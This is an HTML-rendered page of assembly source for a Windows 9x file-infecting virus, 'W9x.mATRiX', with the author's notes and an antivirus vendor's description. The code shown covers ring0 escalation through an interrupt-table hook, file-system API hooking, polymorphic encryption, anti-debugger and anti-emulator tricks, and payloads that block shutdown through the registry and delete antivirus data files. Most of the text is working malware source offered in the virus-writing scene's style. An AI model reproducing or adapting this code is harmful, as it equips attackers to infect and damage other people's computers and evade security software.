<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Matrix.3597 - matrix.3597.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
	background: #FFFFCC;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment                                                                           ˇ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; released</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ˙ ƒÕƒÕÕÕÕƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒ˙ƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒÕÕÕƒÕƒ ˙</span><span class="sc0">
</span><span class="sc1">;              ‹‹‹‹‹                                           ∞</span><span class="sc0">
</span><span class="sc1">;     €€€€   ∞  ﬂﬂﬂﬂ €€€€ﬂ€€€ €€€€ﬂ€€€€ €€€€   €€€€˛ﬂﬂﬂﬂ €€€€ﬂ€€€€ €€€€ﬂ€€€€2000</span><span class="sc0">
</span><span class="sc1">;   ∞ ≤€€€ ∞    €€€€ ≤€€€‹  ∞ €€€€˛     €€€€ ∞ ≤€€€ €€€€ €€€€  ∞   ≤€€€˛     ∞</span><span class="sc0">
</span><span class="sc1">; ∞∞∞∞≤€€€∞€€€€∞≤€€€∞€€€€∞∞∞∞∞€€€€∞€€€€∞≤€€€∞€∞€€€€∞≤€€€∞≤€€€∞∞∞∞∞∞≤€€€∞€€€€∞ ∞∞</span><span class="sc0">
</span><span class="sc1">;   ∞ ≤€€€‹€€€€‹≤€€€ ≤€€€  ∞  ≤€€€‹€€€€ ≤€€€‹€‹€€€€ ≤≤€€‹≤€€€  ∞  ∞≤€€€‹€€€€[LW]</span><span class="sc0">
</span><span class="sc1">;                 ﬂﬂﬂﬂﬂﬂﬂ                                             ∞</span><span class="sc0">
</span><span class="sc1">;         W9x.mATRiX.size by LiFEwiRE [ShadowVX] - www.shadowvx.org</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Intro</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         This virus is my first windows virus, and the result of reading some</span><span class="sc0">
</span><span class="sc1">;         docs, tutorial and (Ring0 virus)-sources.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         It is not a very complicated virus, and it doesn't use new technics</span><span class="sc0">
</span><span class="sc1">;         too... Maybe the ASCII counter is some unusual feature.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         When debugging is enabled, this things are extra:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Unload when dword at bff70400 &lt;&gt; 0h</span><span class="sc0">
</span><span class="sc1">;         Beep at certain events (get resident, unload &amp; infect)</span><span class="sc0">
</span><span class="sc1">;         Beep can be turned off by changing byte ptr at bff70408 &lt;&gt; 0h</span><span class="sc0">
</span><span class="sc1">;         only infects files at your D: drive (it's my test drive)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         I use WinIce to modify the values.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Specs:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Ring0 resident, infects on IFSmgr file rename, open and attrib, EXE,</span><span class="sc0">
</span><span class="sc1">;         SCR and COM (!) files. Com files are infected for the payload, a scene</span><span class="sc0">
</span><span class="sc1">;         from The Matrix. The COM files are not really infected, but some date</span><span class="sc0">
</span><span class="sc1">;         checking code and action is appended on it. When the month is equal</span><span class="sc0">
</span><span class="sc1">;         to the date the payload will start.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Infection  : Increasing last section, and make a jump at orignal</span><span class="sc0">
</span><span class="sc1">;                      entrypoint to it (when modifying EP to last section</span><span class="sc0">
</span><span class="sc1">;                      AVPM will popup:( )</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Encryption : XOR'd and polymorfic-build-up-decryptors.</span><span class="sc0">
</span><span class="sc1">;         Armour     : Anti debugger &amp; anti emulator (SEH &amp; Anti-SoftICE)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Payload(s) : 2, as i said above 1 which is appended to all .com files</span><span class="sc0">
</span><span class="sc1">;                      on opening and c:\windows\win.com which will display</span><span class="sc0">
</span><span class="sc1">;                      'Wake up Neo... / The Matrix has you... / w9x.mATRiX'</span><span class="sc0">
</span><span class="sc1">;                      like in the movie (except the last sentence, w9x.mATRiX:)</span><span class="sc0">
</span><span class="sc1">;                      when the day is equal to the month (1 jan, 2 feb,etc.)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                      the other payload will remove the shutdown command from</span><span class="sc0">
</span><span class="sc1">;                      the start menu using the registery - at 06 april.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         KnownBugs :  No I know... I tested this code a lot, and a friend of me</span><span class="sc0">
</span><span class="sc1">;                   :  infected his own PC accidently and it worked really good</span><span class="sc0">
</span><span class="sc1">;                      :)... The only problem is that F-prot hangs on infected</span><span class="sc0">
</span><span class="sc1">;                      files... hehe but that's not my problem :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Thanx  to : Lord Julus, Billy Belcebu &amp; Z0MBiE.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Greets to : Ruzz', Kamaileon, z3r0, Bhunji, Dageshi, all other Shadow-</span><span class="sc0">
</span><span class="sc1">;                     VX members,                        </span><span class="sc0">
</span><span class="sc1">;                     r-, GigaByte, VirusBuster, CyberYoda, T00fic, all other</span><span class="sc0">
</span><span class="sc1">;                     people i met on #virus &amp; #vir, and 29A &amp; iKX for their</span><span class="sc0">
</span><span class="sc1">;                     nice magazines.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                     and some non-virus greets:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                     Ghostie :P, Hampy, nog wat XXXClan'ers, DJ Accelerator,</span><span class="sc0">
</span><span class="sc1">;                     King Smozzeboss SMOS from Conehead SMOS games [NL1SMS]</span><span class="sc0">
</span><span class="sc1">;                     PiepPiep, NL0JBL, BlueLIVE, MisterE &amp; Xistence.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Compile:    Tasm32 /m3 /ml LiFEwiRE.ASM,</span><span class="sc0">
</span><span class="sc1">;                     tlink32 /Tpe /aa /c LiFEwiRE.OBJ,,,import32.lib</span><span class="sc0">
</span><span class="sc1">;                     pewrsec LiFEwiRE.EXE</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Contact:    Lifewire@mail.ru</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ˙ƒÕƒÕÕÕÕƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒ˙ƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒÕÕÕƒÕƒ ˙   ˇ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Description at www.viruslist.com</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Win95.Matrix</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; It is not a dangerous memory resident polymorphic parasitic Win9x virus. It</span><span class="sc0">
</span><span class="sc1">; stays in the Windows memory as a device driver (VxD) by switching from</span><span class="sc0">
</span><span class="sc1">; application mode to Windows kernel (Ring3-&gt;Ring0), hooks disk files access</span><span class="sc0">
</span><span class="sc1">; functions, and infect PE executable files with EXE and SCR file name</span><span class="sc0">
</span><span class="sc1">; extensions, and affects DOS COM files.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; While infecting a PE EXE file the virus encrypts itself and writes to the</span><span class="sc0">
</span><span class="sc1">; file end. The virus also patches program's startup code with a short routine</span><span class="sc0">
</span><span class="sc1">; that passes control to main virus code.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; While affecting DOS COM files the virus writes to the end of file a short</span><span class="sc0">
</span><span class="sc1">; routine that has no infection abilities, but just displays a message on</span><span class="sc0">
</span><span class="sc1">; July 7th:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Wake up, Neo...</span><span class="sc0">
</span><span class="sc1">;  The Matrix has you...</span><span class="sc0">
</span><span class="sc1">;  w9x.mATRiX</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus also affects the C:\WINDOWS\WIN.COM file in the same way.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; On April 6th the virus modifies the system registry key:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer NoClose = 1</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; As the result of this key a user cannot switch off the computer.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus also deletes anti-virus data files: AVP.CRC, ANTI-VIR.DAT, IVB.NTZ,</span><span class="sc0">
</span><span class="sc1">; CHKLIST.MS.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus contains the text strings:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; [- comment from LiFEwiRE- AV'ers forgot to put the strings here??]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; where 'xxxxxxx' is the virus' "generation" number.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ˙ƒÕƒÕÕÕÕƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒ˙ƒÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕƒÕÕÕƒÕƒ ˙   ˇ</span><span class="sc0">

</span><span class="sc2">.486p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc1">;                 ;only 4 first gen.</span><span class="sc0">

</span><span class="sc1">;----- -[Equ's]- ------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">debug</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;test/debug version?</span><span class="sc0">

</span><span class="sc5">virusz</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">sectionflags</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000020h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">inthook</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">05h</span><span class="sc0">                     </span><span class="sc1">;let's hook this int for ring0</span><span class="sc0">
 </span><span class="sc9">else</span><span class="sc0">
</span><span class="sc5">inthook</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">                     </span><span class="sc1">;let's hook this int for ring0</span><span class="sc0">
 </span><span class="sc9">endif</span><span class="sc0">
 
</span><span class="sc5">JmpToCodesz</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndJmpToCode</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">JmpToCode</span><span class="sc0">

</span><span class="sc5">IFSMgr</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0040h</span><span class="sc0">          </span><span class="sc1">;for VxDCall</span><span class="sc0">
</span><span class="sc5">InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">067h</span><span class="sc0">           </span><span class="sc1">;used in ring0 hooker</span><span class="sc0">
</span><span class="sc5">UniToBCSPath</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">041h</span><span class="sc0">           </span><span class="sc1">;used in hook to convert uni2ansi</span><span class="sc0">
</span><span class="sc5">Ring0_FileIO</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">032h</span><span class="sc0">           </span><span class="sc1">;for all file i/o</span><span class="sc0">

</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">            </span><span class="sc1">;hooked functions</span><span class="sc0">
</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">24h</span><span class="sc0">
</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">25h</span><span class="sc0">

</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D500h</span><span class="sc0">         </span><span class="sc1">;used with ring0_fileIO</span><span class="sc0">
</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D700h</span><span class="sc0">
</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D601h</span><span class="sc0">
</span><span class="sc5">R0_READFILE</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D600h</span><span class="sc0">
</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D800h</span><span class="sc0">
</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04300h</span><span class="sc0">
</span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">R0_DELETEFILE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04100h</span><span class="sc0">

</span><span class="sc5">PC_STATIC</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20000000h</span><span class="sc0">      </span><span class="sc1">;for allocating pages</span><span class="sc0">
</span><span class="sc5">PC_WRITEABLE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00020000h</span><span class="sc0">      </span><span class="sc1">;and protecting them from</span><span class="sc0">
</span><span class="sc5">PC_USER</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00040000h</span><span class="sc0">      </span><span class="sc1">;ring3 code</span><span class="sc0">
</span><span class="sc5">PAGEZEROINIT</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">PAGEFIXED</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000008h</span><span class="sc0">
</span><span class="sc5">PG_SYS</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Get_DDB</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0146h</span><span class="sc0">          </span><span class="sc1">;VMMCall to find S-ICE</span><span class="sc0">

</span><span class="sc5">PageAllocate</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0053h</span><span class="sc0">
</span><span class="sc5">PageModifyPermissions</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0133h</span><span class="sc0">

</span><span class="sc5">SizeInPages</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">virusz</span><span class="sc4">+</span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4095</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">


</span><span class="sc5">RegOpenKey</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0148h</span><span class="sc0">          </span><span class="sc1">;used by payload for registery</span><span class="sc0">
</span><span class="sc5">RegSetValueEx</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0152h</span><span class="sc0">          </span><span class="sc1">;modifying</span><span class="sc0">
</span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80000001h</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">REG_DWORD</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">debug_beep_FREQ</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1700</span><span class="sc0">           </span><span class="sc1">;for debugging</span><span class="sc0">
</span><span class="sc5">debug_beep_DELAY</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">50</span><span class="sc4">*</span><span class="sc2">65536</span><span class="sc0">

</span><span class="sc5">debug_beep_FREQ2</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">700</span><span class="sc0">           </span><span class="sc1">;for debugging</span><span class="sc0">
</span><span class="sc5">debug_beep_DELAY2</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">100</span><span class="sc4">*</span><span class="sc2">65536</span><span class="sc0">

</span><span class="sc1">;----- -[Macro's]- ----------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">vxd_id</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">service_id</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">service_id</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">vxd_id</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">service_id</span><span class="sc0">                      </span><span class="sc1">;Is just less work than doing</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">                             </span><span class="sc1">;a VxDCall VMM, service</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">service_id</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;        display "Debug Version"</span><span class="sc0">
        </span><span class="sc9">else</span><span class="sc0">
        </span><span class="sc5">display</span><span class="sc0"> </span><span class="sc3">" ∞±≤€ *Warning* This is the real version of the virus €≤±∞"</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc1">;----- -[Code]- -------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">_CODE</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdelta</span><span class="sc0">
</span><span class="sc5">getdelta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00001000h</span><span class="sc0">                   </span><span class="sc1">;Get imagebase at runtime</span><span class="sc0">
</span><span class="sc5">newEIP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">imagebase</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setupSEHandKillEmu</span><span class="sc0">              </span><span class="sc1">;The call pushes the offset</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;Error gives us old ESP                          </span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">backtocode</span><span class="sc0">

</span><span class="sc5">setupSEHandKillEmu</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;fs:[edx] = smaller then fs:[0]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;Push original SEH handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">                    </span><span class="sc1">;And put the new one (located</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;make error &amp; let our SEH take</span><span class="sc0">
                                                </span><span class="sc1">;control (not nice 4 emu's:)</span><span class="sc0">
</span><span class="sc5">backtocode</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;pops EIP pushed by call setupSEH</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetupSEH</span><span class="sc0">                        </span><span class="sc1">;to kill errors</span><span class="sc0">

        </span><span class="sc1">;if eip gets here an error has occured        </span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;contains old ESP</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RestoreSEH</span><span class="sc0">                      </span><span class="sc1">;...</span><span class="sc0">

</span><span class="sc5">SetupSEH</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;we are save now, if an error</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;occure EIP will be at the</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">                    </span><span class="sc1">;code after SetupSEH</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;'push' int table</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;restore stack from call and</span><span class="sc0">
                                                </span><span class="sc1">;edx contains pointer to IDT</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,(</span><span class="sc5">inthook</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;Get int vector</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">             

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Inthandler</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;routine to let int point to</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
